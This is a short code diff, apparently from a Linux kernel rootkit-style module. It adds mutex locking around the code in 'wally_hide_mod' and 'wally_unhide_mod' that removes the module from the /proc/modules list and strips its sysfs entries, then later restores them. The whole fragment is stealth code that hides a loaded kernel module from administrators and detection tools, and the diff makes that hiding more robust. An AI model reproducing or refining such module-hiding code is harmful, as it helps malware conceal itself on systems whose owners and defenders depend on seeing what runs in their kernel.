@@ -160,6 +160,7 @@ struct rmmod_controller {
     struct module_sect_attrs *attrs;
 };
 static struct rmmod_controller rmmod_ctrl;
+static DEFINE_MUTEX(generic_mutex);
 
 static void wally_hide_mod(void) {
     if (NULL != mod_list)
@@ -185,7 +186,9 @@ static void wally_hide_mod(void) {
 
     // Backup and remove this module from /proc/modules
     mod_list = lkmmod.this_mod->list.prev;
+    mutex_lock(&generic_mutex);
     list_del(&(lkmmod.this_mod->list));
+    mutex_unlock(&generic_mutex);
 
     // Backup and remove this module from sysfs
     rmmod_ctrl.attrs = lkmmod.this_mod->sect_attrs;
@@ -244,7 +247,9 @@ static void wally_unhide_mod(void) {
         goto out_attrs;
 
     // Restore /proc/module entry
+    mutex_lock(&generic_mutex);
     list_add(&(lkmmod.this_mod->list), mod_list);
+    mutex_unlock(&generic_mutex);
     goto out_put_kobj;
 
 out_attrs:
